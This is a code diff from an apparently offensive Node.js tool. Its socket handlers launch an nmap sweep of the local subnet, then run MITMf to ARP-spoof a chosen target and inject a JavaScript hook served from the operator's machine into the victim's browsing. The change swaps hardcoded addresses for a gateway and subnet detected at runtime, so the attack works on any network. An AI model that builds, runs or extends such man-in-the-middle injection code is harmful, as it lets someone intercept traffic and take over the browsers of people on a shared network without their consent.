@@ -141,7 +141,9 @@ listener.sockets.on('connection', function(socket){
     });
 
     socket.on('scan_network',function(){
-        var options = ['-oX','public/output.xml','-sn','192.168.1.0/24'];
+        var gateway = ip.mask(ip.address(), ip.fromPrefixLen(24))+"/24";
+        console.log(gateway);
+        var options = ['-oX','public/output.xml','-sn',gateway];
         openTerminal('nmap',options);
     });
 
@@ -152,9 +154,10 @@ listener.sockets.on('connection', function(socket){
     socket.on('mitmf_client', function(data){
         sh.kill();
         process.chdir('/root/MITMf');
-        var gateway = ip.mask(ip.address(), ip.fromPrefixLen(24));
+        var gateway = ip.mask(ip.address(), ip.fromPrefixLen(24)).slice(0, -1)+"1";
+        console.log(gateway)
         var scriptPath = 'http://'+ip.address()+':5001/hook/pnsmn.js';
-        var options = ['mitmf.py','-i','wlan0','--spoof','--arp','--target',data.ip,'--gateway','192.168.1.1','--inject','--js-url',scriptPath];
+        var options = ['mitmf.py','-i','wlan0','--spoof','--arp','--target',data.ip,'--gateway',gateway,'--inject','--js-url',scriptPath];
         openTerminal("python",options);
     });
 
